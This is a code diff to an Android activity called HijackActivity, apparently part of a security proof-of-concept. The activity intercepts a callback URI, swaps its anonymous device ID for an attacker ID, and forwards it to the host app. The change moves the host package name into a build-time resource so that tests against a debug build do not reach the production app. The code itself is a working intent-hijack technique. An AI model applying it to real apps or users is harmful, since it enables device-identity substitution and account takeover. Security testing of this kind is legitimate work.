@@ -18,7 +18,6 @@ import android.widget.TextView;
  * <p>日志同样只写参数名和哈希，不写原文。
  */
 public class HijackActivity extends Activity {
-    static final String HOST_PACKAGE = "top.xdwa.shun";
     static final String ATTACKER_ID = "YXR0YWNrZXI+ZGV2aWNl";
 
     @Override
@@ -50,7 +49,8 @@ public class HijackActivity extends Activity {
             String swapped = swap(raw, "anonymous_device_id", ATTACKER_ID);
             Log.i(FakeUuActivity.TAG, "HIJACK forward to host, idHash=" + FakeUuActivity.hash(ATTACKER_ID));
             startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(swapped))
-                    .setPackage(HOST_PACKAGE)
+                    // 构建时的 -PhostPackage：写死正式包名的话，对着调试宿主测时会把回调转给手机上留着用的正式版。
+                    .setPackage(getString(R.string.shun_host_package))
                     .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
             finish();
         }
